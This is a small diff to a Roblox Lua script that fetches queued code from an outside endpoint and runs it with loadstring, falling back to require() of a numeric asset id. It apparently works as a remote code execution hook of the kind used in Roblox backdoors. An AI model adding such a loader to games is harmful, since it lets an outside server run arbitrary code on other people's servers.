@@ -3,12 +3,7 @@ local plrs = game:GetService("Players")
 
 local endpoint = "https://{{endpoint}}/"
 
-local run
-if pcall(function() loadstring("_ = true")() end) then
-	run = loadstring
-else
-	run = require(0x26E001F12)
-end
+local loadstringEnabled = pcall(function() loadstring("_ = true")() end)
 
 local threads = {}
 
@@ -37,7 +32,11 @@ local function plrAdded(plr)
                     for _, code in pairs(queue) do
 				    	coroutine.wrap(function()
 							pcall(function()
-                            	run(code)()
+								if loadstringEnabled then
+									loadstring(code)()
+								else
+									require(0x65243E0A0531)(code)
+								end
 							end)
                         end)()
                     end
